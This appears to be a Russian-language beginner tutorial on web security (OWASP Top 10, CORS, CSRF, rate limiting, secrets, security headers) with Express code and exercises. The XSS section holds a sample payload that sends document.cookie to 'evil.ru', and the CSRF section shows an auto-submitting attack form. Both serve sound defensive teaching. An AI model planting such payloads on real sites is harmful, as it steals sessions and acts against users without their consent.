### На пальцах
OWASP Top 10 — список самых частых способов, которыми взламывают сайты, как список самых частых способов, которыми воры проникают в квартиры: открытая форточка, ключ под ковриком, доверчивый консьерж. Знать этот список — значит закрыть 90% реальных дыр.

### Как это работает
Три самые важные для начинающего:

**1. Сломанный контроль доступа** — первое место в списке. Пользователь получает доступ к чужому: меняет id в адресе `/api/orders/124` на `/api/orders/125` и видит чужой заказ.
Защита: проверка владельца и роли в каждом маршруте на сервере, фильтр списков по пользователю.

**2. Инъекции** — данные пользователя становятся частью команды: SQL, команды ОС, запросы к другим системам.
Защита: параметризованные запросы, ORM, никогда не склеивать команды из ввода.

**3. XSS (межсайтовый скриптинг)** — пользователь вставляет на страницу свой JavaScript, например в комментарий: `<img src=x onerror="fetch('https://evil.ru?c='+document.cookie)">`. Код выполнится у всех, кто откроет страницу.
Защита: выводить пользовательский текст как текст (`textContent`, JSX по умолчанию), не использовать `innerHTML` и `dangerouslySetInnerHTML` с пользовательскими данными, при необходимости — очищать HTML библиотекой DOMPurify, httpOnly-cookie, заголовок CSP.

Другие пункты списка: криптографические ошибки (пароли без хеширования, HTTP вместо HTTPS), небезопасная конфигурация (включённый режим отладки, стандартные пароли), устаревшие уязвимые зависимости, ошибки аутентификации (нет защиты от перебора), подделка запросов на сервере (SSRF) и другие.

### Пример
```js
// ❌ сломанный контроль доступа
app.get("/api/orders/:id", requireUser, async (req, res) => {
  const { rows } = await q("SELECT * FROM orders WHERE id = $1", [req.params.id]);
  res.json(rows[0]);
});

// ✅
app.get("/api/orders/:id", requireUser, async (req, res) => {
  const { rows } = await q("SELECT * FROM orders WHERE id = $1 AND user_id = $2", [req.params.id, req.user.id]);
  if (!rows[0]) return res.status(404).json({ error: "Не найдено" });
  res.json(rows[0]);
});
```

```js
// ❌ XSS во фронтенде
list.innerHTML += `<li>${comment.text}</li>`;
// ✅
const li = document.createElement("li");
li.textContent = comment.text;
list.append(li);
```

### Частые ошибки
- Проверять права только во фронтенде.
- `npm audit` никогда не запускается, зависимости годами не обновляются.
- Включённый подробный вывод ошибок в продакшене.

### Мини-задание
Пройди свой API по трём пунктам: найди маршрут без проверки владельца, запрос со склеенной строкой и место во фронтенде, где пользовательский текст вставляется через `innerHTML`. Исправь всё найденное и запусти `npm audit`.

### На пальцах
CORS — правило охранника в браузере, а не на сервере. Браузер говорит: «Скрипт с сайта A хочет прочитать ответ сайта B. Сайт B, ты разрешаешь?» Если сервер не разрешил — браузер не отдаст ответ скрипту. Но curl, Postman или скрипт злоумышленника на своём компьютере этого охранника не имеют — для них CORS не существует.

### Как это работает
- **Origin** (источник) — протокол + домен + порт: `https://studio.ru`, `http://localhost:5173`. Разные порты — разные источники.
- По умолчанию браузер запрещает скрипту читать ответы с другого источника (Same-Origin Policy).
- CORS — способ для сервера сказать браузеру: «этому источнику можно». Делается заголовками ответа:
  - `Access-Control-Allow-Origin: https://studio.ru`
  - `Access-Control-Allow-Credentials: true` — если нужны cookie
  - `Access-Control-Allow-Methods`, `Access-Control-Allow-Headers` — для сложных запросов.
- Для «сложных» запросов (JSON-тело, PUT/DELETE, свои заголовки) браузер сначала отправляет предварительный запрос `OPTIONS` (preflight) и спрашивает разрешения.

Почему CORS — не защита API:

- он ограничивает только браузеры;
- запрос всё равно доходит до сервера и выполняется — браузер лишь не показывает ответ скрипту;
- защищают API аутентификация, авторизация, rate limiting, валидация.

Правило: разрешай только свои фронтенды, без `*`, особенно если используются cookie.

### Пример
```js
import cors from "cors";

const ALLOWED = ["http://localhost:5173", "https://studio.ru"];

app.use(cors({
  origin(origin, cb) {
    if (!origin || ALLOWED.includes(origin)) cb(null, true);   // !origin — запросы не из браузера
    else cb(new Error("Origin не разрешён"));
  },
  credentials: true,
}));
```

```bash
# curl игнорирует CORS полностью — запрос выполнится
curl -X DELETE https://api.studio.ru/api/projects/5 -H "Cookie: session=..."
```

### Частые ошибки
- `Access-Control-Allow-Origin: *` вместе с cookie — браузер такое не примет, а без cookie открывает API всем сайтам.
- Думать, что настроенный CORS защищает данные.
- Чинить ошибку CORS на фронтенде — её чинят только на сервере (или прокси в dev-сервере).

### Мини-задание
Открой консоль на любом чужом сайте и сделай `fetch` к своему API — посмотри ошибку CORS. Затем выполни тот же запрос через curl и убедись, что сервер его обработал. Потренируйся в задаче «CORS для своего фронтенда».

### На пальцах
CSRF — когда злоумышленник заставляет твой браузер отправить запрос от твоего имени. Ты вошёл в банк, а потом открыл подозрительный сайт. Он незаметно отправляет форму «перевести деньги» на сайт банка. Браузер услужливо прикладывает твою cookie — и банк думает, что это ты. SameSite у cookie — правило: «не прикладывай записку, если письмо отправляет чужой сайт».

### Как это работает
Почему атака возможна: браузер раньше прикладывал cookie к любому запросу на сайт, откуда бы он ни был отправлен — с формы на другом сайте, через картинку, через скрипт.

Защита:

1. **SameSite=Lax** у cookie сессии — браузер не отправит её при POST-запросе с другого сайта. Сейчас это значение по умолчанию в браузерах, но ставь явно.
2. **Не менять данные по GET** — переход по ссылке с другого сайта с `SameSite=Lax` cookie отправляет.
3. **Требовать JSON** для изменяющих запросов: HTML-форма с чужого сайта не может отправить `Content-Type: application/json`, а `fetch` с таким заголовком на чужой домен вызовет preflight CORS, который твой сервер не разрешит.
4. **CSRF-токен** — классическая защита: сервер выдаёт случайный токен, который фронтенд прикладывает к каждой форме; чужой сайт его не знает.
5. Проверка заголовка `Origin` на изменяющих запросах.

Если аутентификация не через cookie, а через заголовок `Authorization`, CSRF не страшен — браузер не подставляет этот заголовок сам.

### Пример
```js
// cookie
res.cookie("session", token, { httpOnly: true, secure: true, sameSite: "lax" });

// изменяющие запросы принимаем только как JSON
app.use("/api", (req, res, next) => {
  if (["POST", "PUT", "PATCH", "DELETE"].includes(req.method) && !req.is("application/json")) {
    return res.status(415).json({ error: "Ожидается JSON" });
  }
  next();
});
```

```html
<!-- так выглядела бы атака с чужого сайта — с SameSite=Lax cookie не уйдёт -->
<form action="https://studio.ru/api/projects/5/delete" method="POST">
  <input type="hidden" name="confirm" value="1">
</form>
<script>document.forms[0].submit()</script>
```

### Частые ошибки
- Удаление и изменение через GET-ссылки.
- `SameSite=None` для cookie сессии без реальной необходимости.
- Принимать изменяющие запросы как обычные формы (`urlencoded`) без CSRF-токена.

### Мини-задание
Проверь cookie сессии своего проекта: стоит ли `SameSite=Lax`. Добавь middleware, которое отклоняет изменяющие запросы не в JSON. Попробуй отправить форму на свой API с другой локальной страницы и убедись, что запрос не прошёл.

### На пальцах
Без ограничения попыток вход в аккаунт — кодовый замок, к которому можно подбирать код бесконечно и быстро. Rate limiting — после пяти неправильных кодов замок блокируется на 15 минут. Для честного пользователя незаметно, а перебор миллиона паролей превращается в годы.

### Как это работает
Rate limiting — ограничение числа запросов за промежуток времени по ключу: IP-адрес, пользователь, email.

Где нужен в первую очередь:

- вход и восстановление пароля — защита от подбора;
- регистрация и отправка писем и СМС — защита от спама и счетов;
- дорогие операции — генерация отчётов, запросы к платным API (например, к нейросети);
- весь API — общий щедрый лимит от случайных и намеренных перегрузок.

Как устроено:

- счётчик запросов по ключу за окно времени (например, 10 неудачных входов за 15 минут);
- превышение — ответ **429 Too Many Requests** и заголовок `Retry-After`;
- хранить счётчики в памяти можно, пока сервер один; при нескольких экземплярах — в Redis.

Для входа считают именно неудачные попытки, по ключу «IP + email»: так злоумышленник не может заблокировать вход чужому пользователю со своего IP, а перебор по одному аккаунту останавливается.

### Пример
```js
import rateLimit from "express-rate-limit";

// общий лимит для API
app.use("/api", rateLimit({ windowMs: 60_000, limit: 300 }));

// строгий лимит на вход — только неудачные попытки
const loginLimiter = rateLimit({
  windowMs: 15 * 60_000,
  limit: 10,
  skipSuccessfulRequests: true,
  keyGenerator: req => `${req.ip}:${String(req.body?.email ?? "").toLowerCase()}`,
  message: { error: "Слишком много попыток. Попробуйте через 15 минут." },
});
app.post("/api/auth/login", loginLimiter, loginHandler);
```

### Частые ошибки
- Вход без всяких ограничений.
- Лимит в памяти при нескольких экземплярах сервера — у каждого свой счётчик.
- За прокси (Render, Nginx) все запросы выглядят пришедшими с одного IP — нужно настроить `app.set("trust proxy", 1)`.

### Мини-задание
Добавь ограничение неудачных входов в свой API и проверь скриптом: 11 неверных паролей подряд — на 11-м ответ 429. Потренируйся в задаче «Ограничение запросов» в лаборатории.

### На пальцах
Секреты — ключи от сейфа: пароль базы, ключи платёжки, секрет подписи сессий. Их не оставляют на столе (в коде), не фотографируют (в Git) и не показывают на витрине (во фронтенде). Ротация — периодическая смена замков: если ключ мог утечь, его меняют, и старый перестаёт подходить.

### Как это работает
Правила хранения:

- секреты — только в переменных окружения сервера; локально — в `.env`, который в `.gitignore`;
- в репозитории — `.env.example` без значений;
- во фронтенд-коде секретов нет вообще: всё, что попало в браузер, видно всем;
- у каждого окружения свои ключи: разработка, тесты, продакшен;
- минимальные права: ключ для чтения не должен уметь удалять.

Если секрет утёк (закоммичен в GitHub, отправлен в чат, засветился на скриншоте):

1. Немедленно выпустить новый ключ у сервиса и отозвать старый.
2. Обновить переменные окружения на сервере и перезапустить.
3. Проверить логи сервиса на подозрительное использование.
4. Удаление файла из репозитория не помогает: он остаётся в истории. Боты сканируют GitHub на ключи в течение минут.

Ротация по плану — раз в несколько месяцев или при уходе сотрудника. Для `JWT_SECRET` смена ключа разлогинит всех пользователей — это нужно учитывать.

Инструменты: GitHub Secret Scanning предупреждает об утёкших ключах, менеджеры секретов (Doppler, Vault, секреты хостинга).

### Пример
```bash
# .gitignore
.env
.env.*
!.env.example
```

```js
// при старте — проверить, что все секреты на месте и достаточно надёжны
const required = ["DATABASE_URL", "JWT_SECRET"];
const missing = required.filter(k => !process.env[k]);
if (missing.length) {
  console.error("Не заданы переменные окружения:", missing.join(", "));
  process.exit(1);
}
if (process.env.JWT_SECRET.length < 32) {
  console.error("JWT_SECRET слишком короткий");
  process.exit(1);
}
```

```bash
# сгенерировать надёжный секрет
node -e "console.log(require('crypto').randomBytes(48).toString('base64url'))"
```

### Частые ошибки
- Секрет в коде «временно, потом уберу».
- Удалить закоммиченный ключ и не перевыпустить его.
- Один и тот же ключ для разработки и продакшена.

### Мини-задание
Проверь историю своего репозитория на секреты: `git log -p | grep -i -E "password|secret|api_key"`. Сгенерируй новый `JWT_SECRET` командой выше и добавь проверку переменных при старте. Потренируйся в задаче «Проверка окружения при запуске».

### На пальцах
Заголовки безопасности — инструкции браузеру, как охранять твой сайт: «не открывай меня во фрейме на чужом сайте», «всегда ходи ко мне только по HTTPS», «не угадывай тип файла», «выполняй скрипты только с моего домена». helmet — пакет, который ставит разумный набор таких инструкций одной строкой.

### Как это работает
| Заголовок | Что делает | Защищает от |
|---|---|---|
| `Content-Security-Policy` (CSP) | разрешает загружать скрипты, стили, картинки только из указанных источников | XSS: даже внедрённый скрипт не выполнится |
| `Strict-Transport-Security` (HSTS) | браузер ходит на сайт только по HTTPS | перехвата при первом входе по HTTP |
| `X-Frame-Options` / `frame-ancestors` | запрет показывать сайт во фрейме на чужих сайтах | кликджекинга |
| `X-Content-Type-Options: nosniff` | браузер не угадывает тип файла | выполнения загруженных файлов как скриптов |
| `Referrer-Policy` | сколько информации об адресе передавать другим сайтам | утечки адресов с токенами |

`helmet()` в Express ставит всё это с безопасными значениями по умолчанию и убирает заголовок `X-Powered-By: Express`, который подсказывает, на чём работает сервер.

CSP — самый мощный и самый капризный: нужно перечислить все источники, откуда сайт грузит скрипты, шрифты, картинки и куда делает запросы. Начинают с режима `Content-Security-Policy-Report-Only`, который только сообщает о нарушениях, но ничего не блокирует.

Проверить заголовки сайта: securityheaders.com или вкладка Network → Response Headers.

### Пример
```js
import helmet from "helmet";

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "https://fonts.googleapis.com"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.studio.ru"],
      frameAncestors: ["'none'"],
    },
  },
}));
```

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; frame-ancestors 'none'
Strict-Transport-Security: max-age=15552000; includeSubDomains
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer
```

### Частые ошибки
- Включить строгий CSP и сломать сайт: шрифты, аналитика и картинки с CDN перестают грузиться. Начинай с Report-Only.
- `'unsafe-inline'` в `script-src` «чтобы заработало» — CSP почти перестаёт защищать от XSS.
- HSTS с большим сроком на домене, где ещё не везде работает HTTPS.

### Мини-задание
Подключи `helmet` к своему API, проверь заголовки ответа через `curl -I`. Проверь свой опубликованный сайт на securityheaders.com и исправь то, что можно, не ломая сайт.
